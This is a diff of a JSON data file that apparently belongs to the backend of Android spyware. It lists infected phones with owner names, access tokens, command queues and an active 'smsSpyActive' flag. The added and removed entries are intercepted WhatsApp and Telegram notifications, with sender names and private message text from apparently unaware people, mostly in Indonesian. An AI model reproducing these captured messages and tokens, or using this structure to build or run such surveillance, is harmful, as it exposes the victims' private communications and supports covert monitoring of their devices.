@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776781499398,
+    "lastSeen": 1776781502366,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -6329,6 +6329,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎JB || RULZ STORE KALBAR (4 pesan): ~ Jumbo g mud",
+        "content": "📷 120+ lumut polosan vault 113",
+        "time": "21/04 21:25",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776781500823
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎2934 pesan dari 18 chat",
+        "time": "21/04 21:25",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776781500797
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -10312,22 +10328,6 @@
         "time": "21/04 20:58",
         "pkg": "com.whatsapp",
         "receivedAt": 1776779935136
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎3568 pesan dari 21 chat",
-        "time": "21/04 20:58",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776779933721
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎GB byone/mabar ff 8a (3 pesan): exell",
-        "content": "tunggu kau sekolah ye @⁨Imam⁩",
-        "time": "21/04 20:58",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776779933613
       }
     ],
     "galleryPhotos": [],
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776781497947,
+    "lastSeen": 1776781500726,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -10403,6 +10403,38 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Pesan baru",
+        "time": "21/04 21:24",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776781500140
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Pesan baru",
+        "time": "21/04 21:24",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776781500035
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Pesan baru",
+        "time": "21/04 21:24",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776781500013
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Pesan baru",
+        "time": "21/04 21:24",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776781499991
+      },
       {
         "appName": "Telegram",
         "sender": "Telegram",
@@ -14370,38 +14402,6 @@
         "time": "21/04 20:37",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776778625492
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "[ suendi ]",
-        "content": "Pesan baru dari 1 chat",
-        "time": "21/04 20:36",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776778618407
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "[ suendi ]",
-        "content": "Pesan baru dari 1 chat",
-        "time": "21/04 20:36",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776778617358
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "[ suendi ]",
-        "content": "Pesan baru dari 1 chat",
-        "time": "21/04 20:36",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776778616336
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "Pesan baru",
-        "time": "21/04 20:36",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776778615156
       }
     ],
     "galleryPhotos": [],
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776781498385,
+    "lastSeen": 1776781501389,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
@@ -16704,6 +16704,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "kimm ade' an",
+        "content": "wduh",
+        "time": "21/04 21:25",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776781503018
+      },
       {
         "appName": "WhatsApp",
         "sender": "kimm ade' an",
